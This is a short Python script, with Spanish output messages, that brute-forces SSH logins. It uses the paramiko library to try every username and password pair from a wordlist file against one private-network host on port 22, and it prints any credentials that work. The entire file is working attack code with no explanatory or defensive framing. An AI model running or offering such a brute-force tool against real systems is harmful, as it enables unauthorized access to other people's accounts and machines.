import paramiko
import time

def brute(host, puerto, user, password):
    log=paramiko.util.log_to_file('log.log')
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        client.connect(host, port = puerto, username = user, password = password)
        print("Credenciales de acceso: {}:{}" .format(user,password))
    except :
        print("Fallo la autentificacion....")


ip = "192.168.1.61"
port = 22
users = open("./passwords.txt", "r")
users = users.read().split('\n')
passwords = open("./passwords.txt", "r")
passwords = passwords.read().split('\n')

for u in users:
    for p in passwords:
        time.sleep(3)
        brute(ip, port, u, p)
